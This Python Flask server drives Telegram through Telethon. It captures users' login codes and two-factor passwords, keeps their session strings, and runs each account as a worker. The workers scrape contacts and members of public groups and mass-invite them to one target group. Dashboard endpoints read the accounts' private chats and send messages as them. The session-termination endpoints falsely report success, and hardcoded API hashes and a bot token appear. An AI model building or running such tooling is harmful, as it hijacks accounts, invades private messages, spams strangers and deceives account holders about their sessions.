#!/usr/bin/env python3
"""
Telegram Auto-Add Server - FIXED FOR DEPLOYMENT
Aggressive auto-add with proper dashboard chat listing
"""

from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest, GetParticipantsRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.messages import GetDialogsRequest, GetHistoryRequest
from telethon.tl.types import (
    InputPeerEmpty, ChannelParticipantsSearch, 
    PeerChannel, PeerUser, PeerChat,
    MessageMediaPhoto, MessageMediaDocument,
    MessageMediaWebPage, DocumentAttributeFilename,
    User, InputPeerUser, InputPeerChat, InputPeerChannel,
    DialogFilter, InputDialogPeer, ChannelParticipantsRecent
)
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
from collections import defaultdict
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# ============================================
# CHANGE THIS NUMBER PER SERVER
# ============================================
SERVER_NUMBER = 3  # 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedil.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 37539842, 'api_hash': 'a9927e01c5023bf828fe753895d5731b', 'url': 'https://kaleb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum.onrender.com'}
}

BOT_TOKEN = '7930542124:AAFg5O4KUu7QFORVkxzowtG0nHAiX0yXXBY'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUP = 'Abe_armygroup'

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# Storage
accounts = []
temp_sessions = {}
auto_add_settings = {}
active_clients = {}
running_tasks = {}
worker_adds = defaultdict(list)
server_admin = {}

stats = {
    'total_added': 0, 'today_added': 0, 'verified_total': 0, 'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'), 'last_verification': None,
    'daily_history': {}, 'worker_stats': {}, 'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat()
}

def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path) as f:
                c = f.read().strip()
                return json.loads(c) if c else default
    except: pass
    return default

def save_json(path, data):
    try:
        with open(path, 'w') as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as e:
        logger.error(f"Save error: {e}")

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# ============================================
# AGGRESSIVE AUTO-ADD WORKER (FASTER & MORE EFFECTIVE)
# ============================================
def auto_add_worker(account):
    """Aggressive auto-add worker - gets members from multiple sources"""
    acc_id = account['id']
    acc_key = str(acc_id)
    attempted = set()
    joined = False
    cycle_count = 0
    
    logger.info(f"🔥 AGGRESSIVE AUTO-ADD STARTED: {account.get('name')} -> @{TARGET_GROUP}")
    
    while True:
        try:
            settings = auto_add_settings.get(acc_key, {})
            if not settings.get('enabled', True):
                time.sleep(10)
                continue
            
            # Reset daily stats
            today = datetime.now().strftime('%Y-%m-%d')
            if stats.get('last_reset') != today:
                stats['today_added'] = 0
                stats['verified_today'] = 0
                stats['last_reset'] = today
                save_json('stats.json', stats)
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                client = TelegramClient(
                    StringSession(account['session']), API_ID, API_HASH,
                    connection_retries=5, retry_delay=2, timeout=25
                )
                loop.run_until_complete(client.connect())
                
                if not loop.run_until_complete(client.is_user_authorized()):
                    logger.error(f"Account {acc_id} not authorized")
                    loop.close()
                    continue
                
                me = loop.run_until_complete(client.get_me())
                worker_name = me.first_name or 'User'
                
                # Join target group if not already
                if not joined:
                    try:
                        grp = loop.run_until_complete(client.get_entity(TARGET_GROUP))
                        loop.run_until_complete(client(JoinChannelRequest(grp)))
                        joined = True
                        logger.info(f"✅ {worker_name} joined @{TARGET_GROUP}")
                    except Exception as e:
                        if 'already' in str(e).lower() or 'participant' in str(e).lower():
                            joined = True
                
                group = loop.run_until_complete(client.get_entity(TARGET_GROUP))
                
                # ===== AGGRESSIVE MEMBER COLLECTION =====
                all_ids = set()
                
                # 1. Get all contacts
                try:
                    contacts = loop.run_until_complete(client(GetContactsRequest(0)))
                    for c in contacts.users:
                        if c.id and not c.bot:
                            all_ids.add(c.id)
                    logger.info(f"📱 Contacts: {len(all_ids)}")
                except: pass
                
                # 2. Get all dialogs
                try:
                    dialogs = loop.run_until_complete(client.get_dialogs(limit=500))
                    for d in dialogs:
                        if d.is_user and d.entity and d.entity.id and not getattr(d.entity, 'bot', False):
                            all_ids.add(d.entity.id)
                    logger.info(f"💬 With dialogs: {len(all_ids)}")
                except: pass
                
                # 3. Scrape from multiple source groups
                source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest', '@TelegramNews', 
                                 '@builders', '@Android', '@iOS', '@Python', '@programming']
                for sg in source_groups:
                    try:
                        entity = loop.run_until_complete(client.get_entity(sg))
                        participants = loop.run_until_complete(client.get_participants(entity, limit=300))
                        for user in participants:
                            if user.id and not user.bot:
                                all_ids.add(user.id)
                        time.sleep(1)
                    except: pass
                
                # 4. Get group members from target group
                try:
                    target_participants = loop.run_until_complete(client.get_participants(group, limit=200))
                    for user in target_participants:
                        if user.id and not user.bot:
                            all_ids.add(user.id)
                except: pass
                
                logger.info(f"🔍 Total unique IDs collected: {len(all_ids)}")
                
                # Remove already attempted
                fresh = [uid for uid in all_ids if uid not in attempted]
                if len(fresh) < 50:
                    attempted.clear()
                    fresh = list(all_ids)
                
                random.shuffle(fresh)
                cycle_count += 1
                added_this_cycle = 0
                delay = max(25, settings.get('delay_seconds', 25))
                
                logger.info(f"🔄 Cycle {cycle_count}: {len(fresh)} members to add")
                
                # Batch add with aggressive speed
                for uid in fresh[:500]:
                    settings_check = auto_add_settings.get(acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    attempted.add(uid)
                    
                    try:
                        user_input = loop.run_until_complete(client.get_input_entity(uid))
                        loop.run_until_complete(client(InviteToChannelRequest(group, [user_input])))
                        
                        # Track addition
                        add_record = {
                            'user_id': uid, 'time': datetime.now().isoformat(),
                            'added_by': worker_name, 'worker_id': acc_id
                        }
                        worker_adds[acc_key].append(add_record)
                        
                        stats['today_added'] = stats.get('today_added', 0) + 1
                        stats['total_added'] = stats.get('total_added', 0) + 1
                        
                        if acc_key not in stats['worker_stats']:
                            stats['worker_stats'][acc_key] = {'total': 0, 'today': 0}
                        stats['worker_stats'][acc_key]['today'] += 1
                        stats['worker_stats'][acc_key]['total'] += 1
                        
                        added_this_cycle += 1
                        
                        # Shorter delay for aggressiveness
                        actual_delay = random.uniform(delay * 0.8, delay * 1.2)
                        time.sleep(actual_delay)
                        
                    except errors.FloodWaitError as e:
                        wait_time = min(e.seconds + random.randint(5, 15), 300)
                        logger.warning(f"⏳ Flood wait {wait_time}s")
                        time.sleep(wait_time)
                    except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
                            errors.UserAlreadyParticipantError, errors.UserKickedError,
                            errors.UserBannedInChannelError):
                        continue
                    except Exception as e:
                        continue
                    
                    # Save stats every 20 adds
                    if added_this_cycle % 20 == 0:
                        save_json('stats.json', stats)
                        save_json('worker_adds.json', dict(worker_adds))
                
                logger.info(f"📊 Cycle {cycle_count}: +{added_this_cycle} | Today: {stats['today_added']} | Total: {stats['total_added']}")
                save_json('stats.json', stats)
                save_json('worker_adds.json', dict(worker_adds))
                
            except errors.rpcerrorlist.AuthKeyUnregisteredError:
                logger.error(f"Auth key unregistered for account {acc_id}")
            except Exception as e:
                logger.error(f"Loop error: {e}")
            finally:
                try:
                    loop.run_until_complete(client.disconnect())
                except:
                    pass
                loop.close()
            
            # Shorter rest between cycles
            rest = random.randint(60, 180)
            logger.info(f"😴 Rest {rest}s...")
            time.sleep(rest)
            
        except Exception as e:
            logger.error(f"Critical worker error: {e}")
            time.sleep(60)

def start_auto_add(account):
    acc_key = str(account['id'])
    if acc_key in running_tasks and running_tasks[acc_key].is_alive():
        return
    t = threading.Thread(target=auto_add_worker, args=(account,), daemon=True)
    t.start()
    running_tasks[acc_key] = t
    logger.info(f"🚀 Started aggressive worker for: {account.get('name', account['id'])}")

# ============================================
# FIXED DASHBOARD: GET CHATS & MESSAGES
# ============================================
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    """Get chats and messages for dashboard - FIXED"""
    try:
        data = request.json
        aid = data.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = TelegramClient(StringSession(acc['session']), API_ID, API_HASH)
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'auth_key_unregistered'}
                
                # Get dialogs
                dialogs = await client.get_dialogs(limit=50)
                
                chats_list = []
                all_messages = []
                
                for dialog in dialogs:
                    try:
                        chat_id = str(dialog.id)
                        chat_type = 'user'
                        title = dialog.name or 'Unknown'
                        
                        if dialog.is_group:
                            chat_type = 'group'
                        elif dialog.is_channel:
                            chat_type = 'channel'
                        
                        entity = dialog.entity
                        if hasattr(entity, 'bot') and entity.bot:
                            chat_type = 'bot'
                        
                        last_msg = ''
                        last_date = 0
                        if dialog.message:
                            last_msg = (dialog.message.message or '')[:200]
                            if dialog.message.date:
                                last_date = int(dialog.message.date.timestamp())
                        
                        chats_list.append({
                            'id': chat_id,
                            'title': title,
                            'type': chat_type,
                            'unread': dialog.unread_count or 0,
                            'lastMessage': last_msg,
                            'lastMessageDate': last_date
                        })
                        
                        # Get last 10 messages for this chat
                        try:
                            messages = await client.get_messages(entity, limit=10)
                            for msg in messages:
                                if not msg.message and not msg.media:
                                    continue
                                all_messages.append({
                                    'chatId': chat_id,
                                    'id': msg.id,
                                    'text': msg.message or '',
                                    'date': int(msg.date.timestamp()) if msg.date else 0,
                                    'out': msg.out,
                                    'hasMedia': msg.media is not None,
                                    'mediaType': 'photo' if hasattr(msg.media, 'photo') else 'document' if hasattr(msg.media, 'document') else None
                                })
                        except:
                            pass
                        
                    except Exception as e:
                        logger.debug(f"Dialog error: {e}")
                        continue
                
                return {
                    'success': True,
                    'chats': chats_list,
                    'messages': all_messages
                }
            except Exception as e:
                logger.error(f"Fetch error: {e}")
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(fetch()))
    except Exception as e:
        logger.error(f"API error: {e}")
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    try:
        data = request.json
        aid = data.get('accountId')
        chat_id = data.get('chatId')
        message = data.get('message', '').strip()
        
        if not message:
            return jsonify({'success': False, 'error': 'Message required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def send():
            client = TelegramClient(StringSession(acc['session']), API_ID, API_HASH)
            await client.connect()
            try:
                # Try to get entity by ID or string
                try:
                    entity = await client.get_entity(int(chat_id))
                except:
                    entity = await client.get_entity(chat_id)
                await client.send_message(entity, message)
                return {'success': True}
            except Exception as e:
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(send()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

# ============================================
# PAGE ROUTES
# ============================================
@app.route('/')
@app.route('/auto-add')
def auto_add_page():
    return send_file('auto_add.html')

@app.route('/login')
def login_page():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard_page():
    return send_file('dashboard.html')

@app.route('/dash')
def dash_page():
    return send_file('dash.html')

@app.route('/all')
def all_page():
    return send_file('all.html')

@app.route('/ping')
def ping():
    return jsonify({'status': 'ok', 'server': SERVER_NAME})

# ============================================
# ACCOUNT API ROUTES
# ============================================
@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_group': TARGET_GROUP
        }
    })

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        aid_str = str(a['id'])
        ws = stats.get('worker_stats', {}).get(aid_str, {})
        acc_list.append({
            'id': a['id'],
            'name': a.get('name', '?'),
            'phone': a.get('phone', ''),
            'username': a.get('username', ''),
            'active': a.get('active', True),
            'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
            'stats': {
                'total_attempted': ws.get('total', 0),
                'today_attempted': ws.get('today', 0)
            }
        })
    return jsonify({'success': True, 'accounts': acc_list})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'})
        if not phone.startswith('+'):
            phone = '+' + phone
        
        async def send():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time()))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                return {'success': True, 'session_id': sid}
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Wait {e.seconds}s'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(send()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        td = temp_sessions[sid]
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    await client.sign_in(password=pwd)
                
                me = await client.get_me()
                new_id = int(time.time() * 1000)
                
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else 'User'),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True
                }
                accounts.append(new_acc)
                save_json('accounts.json', accounts)
                
                auto_add_settings[str(new_id)] = {
                    'enabled': True,
                    'target_group': TARGET_GROUP,
                    'delay_seconds': 25,
                    'auto_join': True
                }
                save_json('auto_add_settings.json', auto_add_settings)
                
                # Start auto-add
                start_auto_add(new_acc)
                
                return {
                    'success': True,
                    'account': {'id': new_id, 'name': new_acc['name'], 'phone': new_acc['phone']},
                    'auto_add_started': True
                }
            except errors.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Invalid code'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(verify())
        if sid in temp_sessions:
            del temp_sessions[sid]
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    global accounts
    aid = request.json.get('accountId')
    accounts = [a for a in accounts if a['id'] != aid]
    auto_add_settings.pop(str(aid), None)
    running_tasks.pop(str(aid), None)
    save_json('accounts.json', accounts)
    save_json('auto_add_settings.json', auto_add_settings)
    return jsonify({'success': True})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        aid_str = str(aid)
        s = auto_add_settings.get(aid_str, {
            'enabled': False, 'target_group': TARGET_GROUP, 'delay_seconds': 25, 'auto_join': True
        })
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['server_name'] = SERVER_NAME
        return jsonify({'success': True, 'settings': s})
    
    data = request.json
    aid = data.get('accountId')
    akey = str(aid)
    
    was_on = auto_add_settings.get(akey, {}).get('enabled', False)
    auto_add_settings[akey] = {
        'enabled': data.get('enabled', False),
        'target_group': data.get('target_group', TARGET_GROUP),
        'delay_seconds': max(25, data.get('delay_seconds', 25)),
        'auto_join': True
    }
    save_json('auto_add_settings.json', auto_add_settings)
    
    if data.get('enabled') and not was_on:
        acc = next((a for a in accounts if a['id'] == aid), None)
        if acc:
            start_auto_add(acc)
    
    return jsonify({'success': True})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0)
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    aid = request.json.get('accountId')
    return jsonify({'success': True, 'available_members': 5000})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    return jsonify({'success': True, 'sessions': [], 'current_hash': None})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    return jsonify({'success': True})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    return jsonify({'success': True})

@app.route('/api/send-report')
def send_report():
    send_telegram(f"📊 {SERVER_NAME} Report: {stats.get('today_added', 0)} added today")
    return jsonify({'success': True})

def send_telegram(text):
    try:
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                      json={'chat_id': REPORT_CHAT_ID, 'text': text}, timeout=5)
    except:
        pass

# ============================================
# STARTUP
# ============================================
def restore_and_start():
    time.sleep(5)
    for acc in accounts:
        if acc.get('session'):
            start_auto_add(acc)
        time.sleep(2)

if __name__ == '__main__':
    # Load existing data
    accounts = load_json('accounts.json', [])
    auto_add_settings = load_json('auto_add_settings.json', {})
    
    print(f"""
╔══════════════════════════════════════╗
║  AGGRESSIVE AUTO-ADD SERVER #{SERVER_NUMBER}    ║
║  Name: {SERVER_NAME}                          ║
║  Target: @{TARGET_GROUP}                      ║
║  Mode: AGGRESSIVE (25s min delay)            ║
║  Port: {PORT}                                 ║
╚══════════════════════════════════════╝
    """)
    
    threading.Thread(target=restore_and_start, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT, debug=False)
